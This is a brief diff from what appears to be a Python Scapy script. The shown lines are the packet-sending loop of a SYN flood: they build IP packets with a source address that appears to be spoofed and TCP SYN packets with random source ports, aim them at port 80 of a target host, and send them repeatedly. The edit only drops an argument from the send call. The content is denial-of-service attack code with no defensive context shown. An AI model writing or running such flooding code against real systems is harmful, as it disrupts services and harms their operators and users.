@@ -7,4 +7,4 @@ for i in range (0,load):
     ip_packet = IP(src=src_ip, dst=target)
     tcp_packet = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
     packet = ip_packet / tcp_packet
-    send(packet, verbose=True, monitor=True)
+    send(packet, verbose=True)
